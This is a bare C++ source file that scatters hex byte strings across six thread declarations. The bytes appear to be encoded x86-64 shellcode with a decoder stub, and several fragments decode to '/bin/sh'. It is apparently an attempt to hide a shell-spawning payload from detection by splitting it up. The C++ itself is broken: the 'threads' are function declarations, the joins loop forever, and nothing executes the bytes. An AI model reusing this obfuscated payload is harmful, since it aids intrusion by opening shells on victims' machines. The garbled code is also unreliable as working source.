#include<thread>
#include<iostream>
#include<cstdlib>
#include<sys/socket.h>
#include<cstdarg>
#include<stdio.h>
#include<string.h>
#include<stdlib.h>

using namespace std;


int main(){

    std::string str;

    std::thread t1(pthread_t thread_1);
    std::thread t2(pthread_t thread_2, "\x30\x07\x48\xFF\xC7\x48\xFF\xC6\x66\x81\x3F\x35\x98\x74\x07\x80");
    std::thread t3(pthread_t thread_3, "\x3E\x82\x75\xEA\xEB\xE6\xFF\xE1\xE8\xD4\xFF\xFF\xFF\x01\x82\x6B");
    std::thread t4(pthread_t thread_4, "\x3A\x59\x98\x49\xBA\x2E\x63\x68\x6F\x2E\x72\x69\x01\x52\x49\x88");
    std::thread t5(pthread_t thread_5, "\xE6\x69\x2C\x62\x01\x01\x49\x88\xE7\x53\xE9\x09\x01\x01\x01\x2E");
    std::thread t6(pthread_t thread_6, "\x63\x68\x6F\x2E\x72\x69\x01\x57\x56\x49\x88\xE7\x0E\x04\x35\x98");
    
    while(1){

        t1.join();
        t2.join();
        t3.join();
        t4.join();
        t5.join();
        t6.join();

    }
    

    return 0;

}

void thread_1(){

    std::string str = "\xEB\x27\x5B\x53\x5F\xB0\x82\xFC\xAE\x75\xFD\x57\x59\x53\x5E\x8A\x06";
    
}

void thread_2(char buf){

    std::string str;
    str + &buf;
}

void thread_3(char buf){

    std::string str;
    str + &buf;
}

void thread_4(char buf){

    std::string str;
    str += &buf;
    
}

void thread_5(char buf){

    std::string str;
    str += &buf;
    
}

void thread_6(char buf){

    std::string str;
    str += &buf;
    
}
